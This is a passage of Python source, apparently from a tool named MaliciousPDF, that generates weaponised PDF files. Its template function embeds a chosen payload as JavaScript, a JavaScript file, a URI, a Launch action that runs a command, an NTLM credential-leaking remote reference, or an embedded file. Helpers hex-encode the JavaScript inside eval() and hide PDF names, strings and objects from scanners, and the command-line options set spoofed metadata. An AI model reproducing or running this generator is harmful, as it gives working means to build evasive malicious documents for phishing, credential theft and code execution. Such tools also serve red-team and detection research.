        file.add_objects(font, stream)
        page.dictionary.count = 1
        page.dictionary.content = stream

        page.dictionary.values.update(
            {
                PdfName("Resources"): PdfDictionary(
                    file,
                    values={
                        PdfName("ProcSet"): PdfList(
                            (PdfName("PDF"), PdfName("Text"))
                        ),
                        PdfName("Font"): PdfDictionary(
                            file, values={PdfName("F1"): font}
                        ),
                    },
                ),
                PdfName("MediaBox"): PdfList((0, 0, 612, 792)),
            }
        )
    else:
        page.dictionary.content.stream += bytes(PdfStreamText(PdfString(text), position, **kwargs))
        file.add_objects(font)
        for name, value in page.dictionary.values.items():
            if str(name) == "/Resources":
                for name, value in value.values.items():
                    if str(name) == "/Font":
                        value.values[PdfName(font_name)] = font
                        break
                break

def pdf_bases(
    file: Union[str, PdfFile],
    **kwargs,
) -> Tuple[PdfFile, PdfObject, PdfObject, PdfObject, PdfObject]:

    """
    This function makes PDF basics objects, adds it in the PDF file and returns the PDF file and the basics objects.

    returns: PdfFile(The PDF file objet), PdfObject(PDF catalog), PdfObject(PDF outlines), PdfObject(PDF pages) and PdfObject(PDF page)
    """

    if isinstance(file, str):
        file = PdfFile(file, **kwargs)

    outlines = PdfObject(
        PdfDictionary(file, type_=PdfName("Outlines"), count=0)
    )

    pages = PdfObject(PdfDictionary(file, type_=PdfName("Pages"), count=1))
    page = PdfObject(PdfDictionary(file, type_=PdfName("Page"), parent=pages))
    pages.dictionary.add_kids(page)

    catalog = PdfObject(
        PdfDictionary(
            file,
            type_=PdfName("Catalog"),
            values={PdfName("Outlines"): outlines, PdfName("Pages"): pages},
        )
    )

    file.add_objects(catalog, outlines, pages, page)

    return file, catalog, outlines, pages, page


def javascript_obfuscation(javascript: str) -> str:

    r"""
    This function obfuscates javascript (very basic obfuscation).

    >>> javascript_obfuscation("abc")
    'eval("\\x61\\x62\\x63");'
    >>>
    """

    return (
        'eval("' + "".join(f"\\x{x:0>2x}" for x in javascript.encode()) + '");'
    )


def pdf_obfuscation(file: PdfFile) -> str:

    """
    This file obfuscates PDF file with ObjStm.

    >>> file, catalog, outlines, pages, page = pdf_bases("obfuscation.pdf")
    >>> pdf_obfuscation(file)
    >>> in_streams = [x.in_objstm is None for x in file.objects]
    >>> in_streams.count(False)
    5
    >>> in_streams.count(True)
    1
    >>>
    """

    objstm = PdfObjStm(file)
    objects = [*file.objects]
    file.objects = []
    objstm.add_elements(*objects)
    file.add_objects(objstm)
    file.write()


def init_obfuscation() -> None:

    r"""
    This function changes variables to obfuscate PDF files.

    >>> init_obfuscation()
    >>> str(PdfName("abc"))
    '/#61#62#63'
    >>> str(PdfString("abc"))
    '(\\141\\142\\143)'
    >>>
    """

    PdfString.characters = "\\n"
    PdfName.characters = "agjlotC\\ "


def template(
    filename: str,
    page_title: str,
    body: str,
    type_: str,
    payload: str = None,
    obfuscation: bool = True,
    **kwargs,
):

    """
    This function write a Malicious PDF file based on a template with a body and title.

    >>> template('template_test.pdf', "Company Name", 'This document is confidential, do not show this document !', 'JS', "app.alert('This document is confidental !');", False)
    """

    file, catalog, outlines, pages, page = pdf_bases(filename, **kwargs)

    add_text(
        page,
        page_title,
        (612 / 2 - len(page_title) // 2 * 16, 720),
        text_size=16,
        outline=True,
    )
    add_text(page, body, (100, 600))
    type_ = type_.lower()

    if type_ == "js":
        if obfuscation:
            payload = javascript_obfuscation(payload)
        MaliciousJS(catalog, PdfString(payload))
    elif type_ == "jsfile":
        if obfuscation:
            payload = StringIO(javascript_obfuscation(open(payload, 'r', encoding='latin-1').read()))
        MaliciousJsFile(catalog, payload)
    elif type_ == "uri" or type_ == "url":
        MaliciousURI(catalog, payload)
    elif type_ == "launch":
        MaliciousLaunch(catalog, payload)
    elif type_ == "ntlm":
        MaliciousNTLM(page, payload)
    elif type_ == "file" or type_ == "embeddedfile":
        MaliciousEmbeddedFile(catalog, payload)

    if obfuscation:
        init_obfuscation()
        file.write()# pdf_obfuscation(file)
    else:
        file.write()

def parse_args() -> Namespace:

     """
     This method parses command line arguments.
     """

     parser = ArgumentParser(description="This tool makes malicious PDF.")
     parser_add_argument = parser.add_argument
     parser_add_argument("--filename", "-f", default="template_test.pdf", help="The output filename to write the PDF file.")
     parser_add_argument("--type", "-t", choices=("JS", "JsFile", "URI", "Launch", "NTLM", "EmbeddedFile"), default="JS", help="Type of exploit for the malicious URL.")
     parser_add_argument("--payload", '-p', default="app.alert('This document is malicious ! You are H4CK3D !');", help='The payload/content to exploit (JS: javascript string, JsFile & EmbeddedFile: path/filename, URI: full URL, Launch: command, NTLM: remote filename.')
     parser_add_argument("--title", "-T", default="My malicious PDF", help="The title writted on the top of the page.")
     parser_add_argument("--body", "-b", default="This document is malicious ! You are H4CK3D !", help="The body/content writted on the page.")
     parser_add_argument("--obfuscation", '-o', default=True, action="store_false", help="PDF, strings and javascript obfuscation.")
     parser_add_argument("--version", "-v", type=float, default=1.7, help="The PDF version used for this file.")
     parser_add_argument("--author", "-a", default=getuser(), help="Author in PDF metadata.")
     parser_add_argument("--date", "-d", default=datetime.now().strftime('%Y-%m-%d %H:%M:%S'), help="Date in PDF metadata (format: 'YYYY-mm-dd HH:MM:SS').")
     parser_add_argument("--pdftitle", "-i", default="Malicious PDF", help="Title in PDF metadata.")
     parser_add_argument("--producer", "-P", default="MaliciousPDF", help="Producer in PDF metadata.")
     return parser.parse_args()

def main() -> int:

    """
    The main function to launch MaliciousPDF from the command line.
    """

    argument = parse_args()

    try:
        date = datetime.strptime(argument.date, '%Y-%m-%d %H:%M:%S')
    except ValueError as e:
        print(e, file=stderr)
        return 2

    template(
        argument.filename,
        argument.title,
        argument.body,
        argument.type,
        argument.payload,
        argument.obfuscation,
        version=argument.version,
        author=argument.author,
        date=date,
        title=argument.pdftitle,
        producer=argument.producer,
    )

    return 0

global font_counter
font_counter = 1

if __name__ == "__main__":
    exit(main())
